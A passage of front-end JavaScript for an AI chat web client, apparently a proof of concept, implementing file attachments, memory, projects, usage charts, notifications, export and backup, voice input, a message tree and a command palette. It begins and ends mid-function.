      const reader = new FileReader();
      reader.onload  = e => resolve(e.target.result);
      reader.onerror = reject;
      reader.readAsDataURL(file);
    });
  },

  setupDragDrop(el) {
    el.addEventListener('dragover', e => {
      e.preventDefault();
      el.style.borderColor = 'var(--accent)';
    });
    el.addEventListener('dragleave', () => {
      el.style.borderColor = '';
    });
    el.addEventListener('drop', async e => {
      e.preventDefault();
      el.style.borderColor = '';
      const files = await FileHandler._processFiles([...e.dataTransfer.files]);
      FileHandler._files.push(...files);
      FileHandler.renderAttachments();
    });
  },

  renderAttachments() {
    let bar = document.getElementById('attachment-bar');
    if (!bar) {
      bar = document.createElement('div');
      bar.id        = 'attachment-bar';
      bar.className = 'attachment-bar';
      const inputArea = document.querySelector('.input-area');
      if (inputArea) inputArea.insertBefore(bar, inputArea.firstChild);
    }

    if (!FileHandler._files.length) {
      bar.style.display = 'none';
      return;
    }

    bar.style.display = '';
    bar.innerHTML = FileHandler._files.map((f, i) => {
      const icon  = f.type.startsWith('image/') ? '🖼' : '📄';
      const sizeStr = f.size < 1024 ? f.size + 'B' : f.size < 1048576 ? Math.round(f.size / 1024) + 'KB' : Math.round(f.size / 1048576) + 'MB';
      return \`<div class="attachment-chip">
        <span class="attachment-icon">\${icon}</span>
        <span class="attachment-name">\${ConvList.esc(f.name)}</span>
        <span class="attachment-size">\${sizeStr}</span>
        <button class="btn-icon" onclick="FileHandler.remove(\${i})" style="width:18px;height:18px;font-size:10px">✕</button>
      </div>\`;
    }).join('');
  },

  remove(idx) {
    FileHandler._files.splice(idx, 1);
    FileHandler.renderAttachments();
  },

  clear() {
    FileHandler._files = [];
    FileHandler.renderAttachments();
  },

  getAttachmentContent() {
    return FileHandler._files.map(f => {
      if (f.type.startsWith('image/')) {
        return { type: 'image', source: { type: 'base64', media_type: f.type, data: f.dataUrl.split(',')[1] || '' } };
      }
      return { type: 'text', text: \`[Attached file: \${f.name}]\\n\${f.dataUrl}\` };
    });
  },
};

// Add attachment bar CSS
(function injectAttachmentCSS() {
  const style = document.createElement('style');
  style.textContent = \`
    .attachment-bar{display:none;padding:6px 0;border-bottom:1px solid var(--border);margin-bottom:6px;display:flex;flex-wrap:wrap;gap:6px;}
    .attachment-chip{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;background:var(--surface3);border:1px solid var(--border);border-radius:var(--radius);font-size:11px;max-width:200px;}
    .attachment-name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:120px;}
    .attachment-size{color:var(--text3);flex-shrink:0;}
    .attachment-icon{flex-shrink:0;}
  \`;
  document.head.appendChild(style);
})();

// ================================================================
// MEMORY PANEL
// ================================================================

const MemoryPanel = {
  _entries: [],
  _open: false,

  async load() {
    try {
      const data = await API._json('/memory');
      MemoryPanel._entries = data.memories || [];
      MemoryPanel.render();
    } catch {
      MemoryPanel._entries = [];
    }
  },

  render() {
    let panel = document.getElementById('memory-panel-inner');
    if (!panel) return;
    const entries = MemoryPanel._entries;
    panel.innerHTML = entries.length
      ? entries.map(e => \`<div class="memory-entry" data-id="\${e.uuid}">
          <div class="memory-text">\${ConvList.esc(e.summary)}</div>
          <div class="memory-meta">\${new Date(e.created_at).toLocaleDateString()}</div>
          <button class="btn-icon" onclick="MemoryPanel.delete('\${e.uuid}')" style="position:absolute;right:6px;top:6px">✕</button>
        </div>\`).join('')
      : '<div class="dim" style="padding:12px;font-size:12px">No memories yet</div>';
  },

  async delete(id) {
    try {
      const resp = await fetch(State.workerAUrl + '/memory/' + id, { method: 'DELETE', headers: State.token ? { 'Authorization': 'Bearer ' + State.token } : {} });
      if (resp.ok) {
        MemoryPanel._entries = MemoryPanel._entries.filter(e => e.uuid !== id);
        MemoryPanel.render();
        Toast.ok('Memory deleted');
      }
    } catch {}
  },

  async addEntry(text) {
    try {
      const data = await API._json('/memory', { method: 'POST', body: JSON.stringify({ summary: text }) });
      MemoryPanel._entries.unshift(data);
      MemoryPanel.render();
      Toast.ok('Memory saved');
    } catch (e) {
      Toast.err('Failed to save memory: ' + e.message);
    }
  },
};

(function injectMemoryCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .memory-entry{position:relative;padding:8px 32px 8px 10px;border:1px solid var(--border);border-radius:var(--radius);margin-bottom:6px;font-size:12px;}
    .memory-entry:hover{border-color:var(--border2);}
    .memory-text{color:var(--text);line-height:1.5;}
    .memory-meta{font-size:10px;color:var(--text3);margin-top:3px;font-family:var(--font-mono);}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// PROJECTS PANEL
// ================================================================

const ProjectsPanel = {
  _projects: [],

  async load() {
    try {
      const data = await API._json('/api/organizations/ORG/projects'.replace('ORG', API._orgId));
      ProjectsPanel._projects = Array.isArray(data) ? data : [];
    } catch {
      ProjectsPanel._projects = [];
    }
  },

  async create(name, model) {
    try {
      const proj = await API._json('/api/organizations/ORG/projects'.replace('ORG', API._orgId), {
        method: 'POST',
        body:   JSON.stringify({ name, model: model || State.config.model }),
      });
      ProjectsPanel._projects.unshift(proj);
      Toast.ok('Project created: ' + proj.name);
      return proj;
    } catch (e) {
      Toast.err('Failed to create project: ' + e.message);
      return null;
    }
  },
};

// ================================================================
// USAGE ANALYTICS PANEL
// ================================================================

const UsagePanel = {
  _data: null,
  _chartCanvas: null,

  async load() {
    try {
      const data = await API._json('/bridge/usage_timeline?days=7');
      UsagePanel._data = data;
      UsagePanel.render();
    } catch {}
  },

  render() {
    const container = document.getElementById('usage-panel-body');
    if (!container || !UsagePanel._data) return;

    const timeline = UsagePanel._data;
    if (!Array.isArray(timeline) || !timeline.length) {
      container.innerHTML = '<div class="dim" style="font-size:12px;padding:12px">No usage data yet</div>';
      return;
    }

    const maxMessages = Math.max(...timeline.map(d => d.messages || 0), 1);
    const totalMsgs   = timeline.reduce((s, d) => s + (d.messages || 0), 0);
    const totalToks   = timeline.reduce((s, d) => s + (d.tokens || 0), 0);

    const barChart = timeline.map(d => {
      const pct = ((d.messages || 0) / maxMessages * 100).toFixed(0);
      const date = d.date?.slice(5) || '';
      return \`<div style="display:flex;flex-direction:column;align-items:center;gap:3px;flex:1;">
        <div style="font-size:9px;color:var(--text3);font-family:var(--font-mono)">\${d.messages || 0}</div>
        <div style="width:100%;height:\${Math.max(2, pct * 0.6)}px;background:var(--accent);border-radius:1px;max-height:60px;opacity:\${0.4 + (d.messages || 0) / maxMessages * 0.6}"></div>
        <div style="font-size:9px;color:var(--text3);font-family:var(--font-mono)">\${date}</div>
      </div>\`;
    }).join('');

    container.innerHTML = \`
      <div style="display:flex;gap:12px;margin-bottom:12px;">
        <div class="stat-mini"><span class="stat-mini-val">\${totalMsgs}</span><span class="stat-mini-label">messages (7d)</span></div>
        <div class="stat-mini"><span class="stat-mini-val">\${totalToks > 1000 ? (totalToks / 1000).toFixed(1) + 'K' : totalToks}</span><span class="stat-mini-label">tokens (7d)</span></div>
      </div>
      <div style="display:flex;align-items:flex-end;gap:4px;height:80px;border-bottom:1px solid var(--border);padding-bottom:6px;margin-bottom:4px;">
        \${barChart}
      </div>\`;
  },
};

(function injectUsageCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .stat-mini{flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:8px 10px;}
    .stat-mini-val{display:block;font-size:20px;font-weight:700;color:var(--accent);font-family:var(--font-mono);}
    .stat-mini-label{font-size:10px;color:var(--text2);}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// NOTIFICATION CENTER
// ================================================================

const Notifs = {
  _entries: [],
  _unread:  0,

  async load() {
    try {
      const data  = await API._json('/notifications');
      Notifs._entries = data.notifications || [];
      Notifs._unread  = data.unread_count   || 0;
      Notifs.updateBadge();
    } catch {}
  },

  updateBadge() {
    let badge = document.getElementById('notif-badge');
    if (!badge) return;
    badge.textContent  = Notifs._unread > 0 ? String(Notifs._unread) : '';
    badge.style.display = Notifs._unread > 0 ? '' : 'none';
  },

  async markAllRead() {
    try {
      await API._json('/notifications/mark_all_read', { method: 'POST' });
      Notifs._entries.forEach(n => n.read = true);
      Notifs._unread = 0;
      Notifs.updateBadge();
    } catch {}
  },

  push(title, body, type = 'info') {
    const n = { uuid: 'n_' + Date.now(), type, title, body, read: false, created_at: new Date().toISOString() };
    Notifs._entries.unshift(n);
    Notifs._unread++;
    Notifs.updateBadge();
    Toast[type === 'error' ? 'err' : type === 'warning' ? 'warn' : 'info'](title + (body ? ': ' + body : ''));
  },
};

// ================================================================
// EXPORT DIALOG
// ================================================================

const ExportDialog = {
  open(convId) {
    const overlay = document.getElementById('export-modal');
    if (overlay) {
      overlay.dataset.convId = convId;
      overlay.classList.add('open');
    }
  },
  close() { document.getElementById('export-modal')?.classList.remove('open'); },
  doExport(fmt) {
    const id = document.getElementById('export-modal')?.dataset.convId;
    if (!id) return;
    window.open(API.exportConvUrl(id, fmt), '_blank');
    ExportDialog.close();
  },
};

// Inject export modal HTML
(function injectExportModal() {
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.id        = 'export-modal';
  overlay.innerHTML = \`<div class="modal" style="max-width:360px">
    <div class="modal-header">
      <span class="modal-title">Export conversation</span>
      <button class="btn-icon" onclick="ExportDialog.close()">✕</button>
    </div>
    <div class="modal-body" style="display:flex;flex-direction:column;gap:10px">
      <button class="btn btn-ghost" style="width:100%;justify-content:center" onclick="ExportDialog.doExport('json')">📄 Export as JSON</button>
      <button class="btn btn-ghost" style="width:100%;justify-content:center" onclick="ExportDialog.doExport('markdown')">📝 Export as Markdown</button>
    </div>
  </div>\`;
  overlay.addEventListener('click', e => { if (e.target === overlay) ExportDialog.close(); });
  document.body.appendChild(overlay);
})();

// ================================================================
// SIDE PANELS (Memory, Projects, Usage)
// ================================================================

const SidePanels = {
  _current: null,

  open(name) {
    if (SidePanels._current === name) { SidePanels.close(); return; }
    SidePanels._current = name;

    let panel = document.getElementById('side-panel');
    if (!panel) {
      panel = document.createElement('div');
      panel.id        = 'side-panel';
      panel.className = 'side-panel';
      document.body.appendChild(panel);
    }

    panel.style.display = '';

    if (name === 'memory') {
      panel.innerHTML = \`<div class="side-panel-header"><span class="side-panel-title">💭 Memory</span><div style="display:flex;gap:6px"><button class="btn btn-ghost btn-sm" onclick="MemoryPanel.load()">Refresh</button><button class="btn-icon" onclick="SidePanels.close()">✕</button></div></div><div id="memory-panel-inner" style="padding:10px;overflow-y:auto;flex:1"></div>\`;
      MemoryPanel.load();
    } else if (name === 'projects') {
      panel.innerHTML = \`<div class="side-panel-header"><span class="side-panel-title">📁 Projects</span><div style="display:flex;gap:6px"><button class="btn btn-accent btn-sm" onclick="SidePanels.newProject()">+ New</button><button class="btn-icon" onclick="SidePanels.close()">✕</button></div></div><div id="projects-panel-inner" style="padding:10px;overflow-y:auto;flex:1">Loading…</div>\`;
      ProjectsPanel.load().then(() => {
        const inner = document.getElementById('projects-panel-inner');
        if (!inner) return;
        inner.innerHTML = ProjectsPanel._projects.length
          ? ProjectsPanel._projects.map(p => \`<div class="project-item"><div class="project-name">\${ConvList.esc(p.name)}</div><div class="project-meta mono dim">\${p.conversation_count || 0} convs · \${p.settings?.default_model || 'sonnet'}</div></div>\`).join('')
          : '<div class="dim" style="font-size:12px;padding:8px">No projects yet</div>';
      });
    } else if (name === 'usage') {
      panel.innerHTML = \`<div class="side-panel-header"><span class="side-panel-title">📊 Usage</span><button class="btn-icon" onclick="SidePanels.close()">✕</button></div><div id="usage-panel-body" style="padding:10px;overflow-y:auto;flex:1">Loading…</div>\`;
      UsagePanel.load();
    }
  },

  close() {
    SidePanels._current = null;
    const panel = document.getElementById('side-panel');
    if (panel) panel.style.display = 'none';
  },

  newProject() {
    const name = prompt('Project name:');
    if (name) ProjectsPanel.create(name);
  },
};

(function injectSidePanelCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .side-panel{position:fixed;right:0;top:var(--topbar-h);bottom:0;width:320px;background:var(--surface);border-left:1px solid var(--border);z-index:80;display:none;flex-direction:column;display:flex;}
    .side-panel-header{padding:10px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
    .side-panel-title{font-size:13px;font-weight:700;color:var(--text);}
    .project-item{padding:8px 10px;border:1px solid var(--border);border-radius:var(--radius);margin-bottom:6px;cursor:pointer;}
    .project-item:hover{border-color:var(--accent);}
    .project-name{font-size:13px;font-weight:600;}
    .project-meta{font-size:11px;margin-top:2px;}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// TOOLBAR ENHANCEMENTS — add more buttons after setup
// ================================================================

(function enhanceToolbar() {
  // Wait for DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', enhanceToolbar);
    return;
  }

  // Add side panel buttons to topbar
  const topbar = document.querySelector('.topbar');
  if (topbar) {
    const memBtn = document.createElement('button');
    memBtn.className = 'btn-icon';
    memBtn.title     = 'Memory';
    memBtn.textContent = '💭';
    memBtn.onclick   = () => SidePanels.open('memory');

    const projBtn = document.createElement('button');
    projBtn.className = 'btn-icon';
    projBtn.title     = 'Projects';
    projBtn.textContent = '📁';
    projBtn.onclick   = () => SidePanels.open('projects');

    const usageBtn = document.createElement('button');
    usageBtn.className = 'btn-icon';
    usageBtn.title     = 'Usage';
    usageBtn.textContent = '📊';
    usageBtn.onclick   = () => SidePanels.open('usage');

    const notifBtn = document.createElement('button');
    notifBtn.className = 'btn-icon';
    notifBtn.id        = 'notif-btn';
    notifBtn.title     = 'Notifications';
    notifBtn.style.position = 'relative';
    notifBtn.innerHTML = '🔔<span id="notif-badge" style="position:absolute;top:-2px;right:-2px;background:var(--red);color:#fff;border-radius:50%;font-size:9px;width:13px;height:13px;display:none;align-items:center;justify-content:center;font-family:var(--font-mono);"></span>';

    // Insert before the search button
    const searchBtn = document.getElementById('search-btn');
    if (searchBtn) {
      topbar.insertBefore(usageBtn,  searchBtn);
      topbar.insertBefore(projBtn,   searchBtn);
      topbar.insertBefore(memBtn,    searchBtn);
      topbar.insertBefore(notifBtn,  searchBtn);
    }
  }

  // Set up file attach button
  const attachBtn = document.getElementById('attach-btn');
  if (attachBtn) {
    attachBtn.onclick = async () => {
      const files = await FileHandler.selectFiles();
      if (files.length) {
        FileHandler._files.push(...files);
        FileHandler.renderAttachments();
      }
    };
  }

  // Set up drag-and-drop on the input
  const msgInput = document.getElementById('msg-input');
  if (msgInput) {
    FileHandler.setupDragDrop(msgInput);
  }
})();

// ================================================================
// VOICE INPUT — stub (browser API, works in Chrome/Edge)
// ================================================================

const Voice = {
  _recognition: null,
  _listening:   false,

  isSupported() {
    return !!(window.SpeechRecognition || window.webkitSpeechRecognition);
  },

  toggle() {
    if (!Voice.isSupported()) {
      Toast.warn('Speech recognition not supported in this browser');
      return;
    }
    if (Voice._listening) {
      Voice.stop();
    } else {
      Voice.start();
    }
  },

  start() {
    const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
    Voice._recognition = new SR();
    Voice._recognition.continuous     = true;
    Voice._recognition.interimResults = true;
    Voice._recognition.lang            = 'en-US';
    Voice._recognition.onstart = () => {
      Voice._listening = true;
      const voiceBtn = document.getElementById('voice-btn');
      if (voiceBtn) { voiceBtn.style.color = 'var(--red)'; voiceBtn.title = 'Stop voice input'; }
      Toast.info('Voice input started — speak now');
    };
    Voice._recognition.onresult = (e) => {
      const interim = [...e.results].slice(e.resultIndex).map(r => r[0].transcript).join('');
      const input   = document.getElementById('msg-input');
      if (input && interim) {
        const base = input.dataset.baseText || '';
        input.value = base + interim;
        App.autoResizeInput();
      }
    };
    Voice._recognition.onspeechend = () => {
      const input = document.getElementById('msg-input');
      if (input) input.dataset.baseText = input.value;
    };
    Voice._recognition.onerror = (e) => {
      Toast.err('Voice error: ' + e.error);
      Voice.stop();
    };
    Voice._recognition.onend = () => Voice.stop();
    Voice._recognition.start();
  },

  stop() {
    Voice._listening = false;
    Voice._recognition?.stop();
    Voice._recognition = null;
    const voiceBtn = document.getElementById('voice-btn');
    if (voiceBtn) { voiceBtn.style.color = ''; voiceBtn.title = 'Voice input'; }
    const input = document.getElementById('msg-input');
    if (input) delete input.dataset.baseText;
  },
};

// Add voice button to toolbar
(function addVoiceButton() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', addVoiceButton);
    return;
  }
  const toolbar = document.querySelector('.input-toolbar');
  if (!toolbar) return;
  const voiceBtn = document.createElement('button');
  voiceBtn.id        = 'voice-btn';
  voiceBtn.className = 'btn-icon';
  voiceBtn.title     = 'Voice input';
  voiceBtn.textContent = '🎤';
  voiceBtn.onclick   = () => Voice.toggle();
  toolbar.appendChild(voiceBtn);
})();

// ================================================================
// CONVERSATION TREE RENDERER — show branching structure
// ================================================================

const ConvTree = {
  _render(messages, parentId = null, depth = 0) {
    const children = messages.filter(m => m.parent_message_uuid === parentId);
    if (!children.length) return '';

    return children.map(msg => {
      const text     = Chat.getMessageText(msg).slice(0, 80);
      const isLeaf   = !messages.some(m => m.parent_message_uuid === msg.uuid);
      const role     = msg.role === 'user' ? 'human' : 'assistant';
      const indent   = depth * 16;

      return \`<div class="tree-node" style="padding-left:\${indent}px;" data-uuid="\${msg.uuid}">
        <span class="tree-role \${role}">\${role === 'human' ? '▷' : '◁'}</span>
        <span class="tree-text">\${ConvList.esc(text)}</span>
        \${isLeaf ? '<span class="tree-leaf">●</span>' : ''}
      </div>
      \${ConvTree._render(messages, msg.uuid, depth + 1)}\`;
    }).join('');
  },

  open(convId) {
    const conv = State.conversations.get(convId);
    if (!conv) return;

    let panel = document.getElementById('tree-panel');
    if (!panel) {
      panel = document.createElement('div');
      panel.id        = 'tree-panel';
      panel.className = 'tree-panel';
      document.body.appendChild(panel);
    }

    panel.innerHTML = \`<div class="tree-header"><span>Message Tree</span><button class="btn-icon" onclick="ConvTree.close()">✕</button></div>
      <div class="tree-body">\${ConvTree._render(conv.messages || [])}</div>\`;
    panel.style.display = '';

    panel.querySelectorAll('.tree-node').forEach(el => {
      el.addEventListener('click', () => {
        const msg = (conv.messages || []).find(m => m.uuid === el.dataset.uuid);
        if (msg) Toast.info('Message: ' + Chat.getMessageText(msg).slice(0, 100));
      });
    });
  },

  close() {
    const panel = document.getElementById('tree-panel');
    if (panel) panel.style.display = 'none';
  },
};

(function injectTreeCSS() {
  const s = document.createElement('style');
  s.textContent = \`
    .tree-panel{position:fixed;left:var(--sidebar-w);top:var(--topbar-h);bottom:0;width:280px;background:var(--surface);border-right:1px solid var(--border);z-index:60;display:none;flex-direction:column;overflow:hidden;}
    .tree-header{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;font-size:12px;font-weight:700;}
    .tree-body{overflow-y:auto;flex:1;padding:8px;}
    .tree-node{display:flex;align-items:center;gap:6px;padding:4px 6px;cursor:pointer;border-radius:var(--radius);font-size:11px;}
    .tree-node:hover{background:var(--surface3);}
    .tree-role.human{color:var(--blue);}
    .tree-role.assistant{color:var(--accent);}
    .tree-text{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--text2);}
    .tree-leaf{color:var(--accent);font-size:8px;}
  \`;
  document.head.appendChild(s);
})();

// ================================================================
// BACKUP / RESTORE — import/export all conversation data
// ================================================================

const BackupRestore = {
  async export() {
    const data = {
      version:       1,
      exported_at:   new Date().toISOString(),
      conversations: [...State.conversations.values()],
      artifacts:     [...State.artifacts.values()],
      config: {
        model:         State.config.model,
        mutation_mode: State.config.mutation_mode,
        workerAUrl:    State.workerAUrl,
      },
    };
    const json = JSON.stringify(data, null, 2);
    const blob = new Blob([json], { type: 'application/json' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href     = url;
    a.download = 'sister-poc-backup-' + new Date().toISOString().slice(0, 10) + '.json';
    a.click();
    URL.revokeObjectURL(url);
    Toast.ok('Backup exported');
  },

  async import() {
    const input = document.createElement('input');
    input.type   = 'file';
    input.accept = '.json';
    input.onchange = async () => {
      const file = input.files[0];
      if (!file) return;
      try {
        const text = await file.text();
        const data = JSON.parse(text);
        if (!data.version || !data.conversations) throw new Error('Invalid backup format');
        let imported = 0;
        for (const conv of data.conversations) {
          if (!State.conversations.has(conv.id)) {
            State.conversations.set(conv.id, conv);
            await persistConversation(conv);
            imported++;
          }
        }
        if (data.artifacts) {
          for (const art of data.artifacts) {
            State.artifacts.set(art.id, art);
            await persistArtifact(art);
          }
        }
        ConvList.render();
        Toast.ok(\`Imported \${imported} conversations\`);
      } catch (e) {
        Toast.err('Import failed: ' + e.message);
      }
    };
    input.click();
  },
};

// ================================================================
// KEYBOARD SHORTCUT MANAGER
// ================================================================

const Shortcuts = {
  _map: new Map(),

  register(combo, handler) {
    Shortcuts._map.set(combo.toLowerCase(), handler);
  },

  handle(e) {
    const parts = [];
    if (e.ctrlKey || e.metaKey) parts.push('ctrl');
    if (e.shiftKey) parts.push('shift');
    if (e.altKey)   parts.push('alt');
    parts.push(e.key.toLowerCase());
    const combo = parts.join('+');
    const handler = Shortcuts._map.get(combo);
    if (handler) { e.preventDefault(); handler(e); }
  },
};

// Register shortcuts (additional ones beyond App._setupEventListeners)
document.addEventListener('DOMContentLoaded', () => {
  Shortcuts.register('ctrl+shift+m', () => SidePanels.open('memory'));
  Shortcuts.register('ctrl+shift+p', () => SidePanels.open('projects'));
  Shortcuts.register('ctrl+shift+u', () => SidePanels.open('usage'));
  Shortcuts.register('ctrl+e',       () => { if (State.currentConvId) ExportDialog.open(State.currentConvId); });
  Shortcuts.register('ctrl+/',       () => { const input = document.getElementById('msg-input'); if (input) input.focus(); });
  Shortcuts.register('ctrl+shift+b', () => BackupRestore.export());
  Shortcuts.register('f1',           () => Toast.info('Help: Ctrl+K search · Ctrl+Shift+O new conv · Ctrl+E export · Ctrl+Shift+M memory'));
  document.addEventListener('keydown', e => Shortcuts.handle(e));
});

// ================================================================
// SETTINGS PANEL ENHANCEMENTS — backup/restore buttons
// ================================================================

(function enhanceSettingsPanel() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', enhanceSettingsPanel);
    return;
  }
  const settingsBody = document.querySelector('.settings-body');
  if (!settingsBody) return;

  const backupSection = document.createElement('div');
  backupSection.className = 'settings-section';
  backupSection.innerHTML = \`
    <div class="settings-section-label">Data &amp; Backup</div>
    <div style="display:flex;gap:8px">
      <button class="btn btn-ghost" onclick="BackupRestore.export()">📤 Export all data</button>
      <button class="btn btn-ghost" onclick="BackupRestore.import()">📥 Import backup</button>
    </div>
    <div style="margin-top:10px;">
      <button class="btn btn-ghost" onclick="SidePanels.open('usage')" style="margin-right:6px">📊 View usage</button>
      <button class="btn btn-ghost" onclick="SidePanels.open('memory')">💭 Manage memory</button>
    </div>\`;

  const saveBtn = document.getElementById('save-settings-btn');
  if (saveBtn?.parentElement) {
    saveBtn.parentElement.parentElement.insertBefore(backupSection, saveBtn.parentElement);
  }
})();

// ================================================================
// CONVERSATION ACTIONS (right-click in message list)
// ================================================================

(function setupMessageContextMenu() {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', setupMessageContextMenu);
    return;
  }
  const messages = document.getElementById('messages');
  if (!messages) return;

  messages.addEventListener('contextmenu', e => {
    const msgEl = e.target.closest('.msg');
    if (!msgEl) return;
    e.preventDefault();
    const msgId = msgEl.dataset.id;
    CtxMenu.open(e.clientX, e.clientY, [
      { label: 'Copy message',    icon: '⎘', action: 'copy',   handler: () => {
        const text = msgEl.querySelector('.msg-content')?.textContent || '';
        navigator.clipboard.writeText(text).then(() => Toast.ok('Copied')).catch(() => Toast.err('Copy failed'));
      }},
      { label: 'Copy all text',   icon: '📋', action: 'copyall', handler: () => {
        const conv = State.conversations.get(State.currentConvId);
        if (conv) {
          const text = (conv.messages || []).map(m => \`\${m.role}: \${Chat.getMessageText(m)}\`).join('\\n\\n');
          navigator.clipboard.writeText(text).then(() => Toast.ok('Copied all messages')).catch(() => {});
        }
      }},
      '-',
      { label: 'Export JSON',     icon: '⬇', action: 'expj',   handler: () => { if (State.currentConvId) window.open(API.exportConvUrl(State.currentConvId, 'json')); } },
      { label: 'Export Markdown', icon: '⬇', action: 'expmd',  handler: () => { if (State.currentConvId) window.open(API.exportConvUrl(State.currentConvId, 'markdown')); } },
      '-',
      { label: 'Branch from here',icon: '⑂', action: 'branch', handler: () => Toast.info('Branching: start a new conversation from this point') },
      { label: 'View message tree',icon: '🌳', action: 'tree',  handler: () => { if (State.currentConvId) ConvTree.open(State.currentConvId); } },
    ]);
  });
})();

// ================================================================
// APPLY SYNTAX HIGHLIGHTING AFTER EACH RENDER
// ================================================================

// Override Chat.renderAll to apply syntax highlighting
const _origRenderAll = Chat.renderAll.bind(Chat);
Chat.renderAll = function(conv) {
  _origRenderAll(conv);
  setTimeout(() => Syntax.highlight(document.getElementById('messages') || document.body), 50);
};

// Also apply after streaming completes (the onDone handler re-renders text)
const _observer = new MutationObserver(() => {
  const msgs = document.getElementById('messages');
  if (msgs) Syntax.highlight(msgs);
});

document.addEventListener('DOMContentLoaded', () => {
  const msgs = document.getElementById('messages');
  if (msgs) {
    _observer.observe(msgs, { childList: true, subtree: true });
  }
});

// ================================================================
// COMMAND PALETTE (Ctrl+K enhanced)
// ================================================================

const CommandPalette = {
  _commands: [],
  _filtered: [],
  _selected: 0,

  _buildCommands() {
    CommandPalette._commands = [
      { id: 'new',       icon: '✚', label: 'New conversation',     desc: 'Start a new conversation', fn: () => App.newConversation() },
      { id: 'search',    icon: '⌕', label: 'Search conversations', desc: 'Search by content',        fn: () => App.openSearch() },
      { id: 'settings',  icon: '⚙', label: 'Open settings',        desc: 'Configure Worker A',       fn: () => App.openSettings() },
      { id: 'memory',    icon: '💭', label: 'Manage memory',        desc: 'View and edit memories',   fn: () => SidePanels.open('memory') },
      { id: 'projects',  icon: '📁', label: 'View projects',        desc: 'Browse your projects',     fn: () => SidePanels.open('projects') },
      { id: 'usage',     icon: '📊', label: 'Usage analytics',      desc: 'View token usage',         fn: () => SidePanels.open('usage') },
      { id: 'export',    icon: '⬇', label: 'Export conversation',   desc: 'Download as JSON or MD',   fn: () => { if (State.currentConvId) ExportDialog.open(State.currentConvId); } },
      { id: 'backup',    icon: '📤', label: 'Backup all data',       desc: 'Export everything to JSON',fn: () => BackupRestore.export() },
      { id: 'restore',   icon: '📥', label: 'Restore from backup',   desc: 'Import a JSON backup',     fn: () => BackupRestore.import() },
      { id: 'clear',     icon: '🗑', label: 'Clear conversation',    desc: 'Remove all messages',      fn: () => App.clearConv() },
      { id: 'thinking',  icon: '💭', label: 'Toggle extended thinking', desc: 'Enable/disable thinking mode', fn: () => App.toggleThinking() },
      { id: 'tools',     icon: '🔧', label: 'Toggle tools',          desc: 'Enable/disable tool use', fn: () => App.toggleTools() },
      { id: 'tree',      icon: '🌳', label: 'View message tree',     desc: 'Show branching structure', fn: () => { if (State.currentConvId) ConvTree.open(State.currentConvId); } },
      { id: 'health',    icon: '💗', label: 'Worker A health',       desc: 'Check server status',      fn: () => App._checkWorkerA() },
      { id: 'shortcuts', icon: '⌨', label: 'Keyboard shortcuts',    desc: 'Show shortcut reference',  fn: () => CommandPalette.showShortcuts() },
      { id: 'logout',    icon: '⊗', label: 'Sign out',              desc: 'Log out of Worker B',      fn: () => App.doLogout() },
      ...([...State.conversations.values()].slice(0, 8).map(c => ({
        id:   'conv_' + c.id,
        icon: c.starred ? '★' : '💬',
        label: c.name || 'Untitled',
        desc:  'Open conversation',
        fn:    () => App.loadConversation(c.id),
      }))),
    ];
  },

  open() {
    CommandPalette._buildCommands();
    CommandPalette._filtered = CommandPalette._commands;
    CommandPalette._selected = 0;

    let overlay = document.getElementById('cmd-palette-overlay');
    if (!overlay) {
      overlay = document.createElement('div');
      overlay.id        = 'cmd-palette-overlay';
      overlay.className = 'cmd-palette-overlay';
      overlay.innerHTML = \`<div class="cmd-palette">
        <div class="cmd-input-wrap">
          <span class="cmd-icon">⌕</span>
          <input id="cmd-input" class="cmd-input" placeholder="Type a command or search conversations…">
        </div>
        <div id="cmd-list" class="cmd-list"></div>
      </div>\`;
      document.body.appendChild(overlay);
      overlay.addEventListener('click', e => { if (e.target === overlay) CommandPalette.close(); });
      document.getElementById('cmd-input').addEventListener('input', e => CommandPalette.filter(e.target.value));
      document.getElementById('cmd-input').addEventListener('keydown', e => CommandPalette.onKey(e));
    }

    overlay.style.display = '';
    const input = document.getElementById('cmd-input');
    if (input) { input.value = ''; input.focus(); }
    CommandPalette.renderList();
  },

  close() {
    const overlay = document.getElementById('cmd-palette-overlay');
    if (overlay) overlay.style.display = 'none';
  },

  filter(q) {
    const query = q.toLowerCase().trim();
    CommandPalette._filtered = query
      ? CommandPalette._commands.filter(c => c.label.toLowerCase().includes(query) || c.desc.toLowerCase().includes(query))
      : CommandPalette._commands;
    CommandPalette._selected = 0;
    CommandPalette.renderList();
  },

  renderList() {
    const list = document.getElementById('cmd-list');
    if (!list) return;
    list.innerHTML = CommandPalette._filtered.slice(0, 12).map((cmd, i) =>
      \`<div class="cmd-item\${i === CommandPalette._selected ? ' selected' : ''}" data-idx="\${i}">
        <span class="cmd-item-icon">\${cmd.icon}</span>
        <div class="cmd-item-text">
          <span class="cmd-item-label">\${ConvList.esc(cmd.label)}</span>
          <span class="cmd-item-desc">\${ConvList.esc(cmd.desc)}</span>
        </div>
      </div>\`
    ).join('');

    list.querySelectorAll('.cmd-item').forEach(el => {
      el.addEventListener('mouseenter', () => {
        CommandPalette._selected = parseInt(el.dataset.idx);
        CommandPalette.renderList();
      });
      el.addEventListener('click', () => {
        const cmd = CommandPalette._filtered[parseInt(el.dataset.idx)];
        if (cmd) { CommandPalette.close(); cmd.fn(); }
      });
    });
  },

  onKey(e) {
    if (e.key === 'ArrowDown') {
      e.preventDefault();
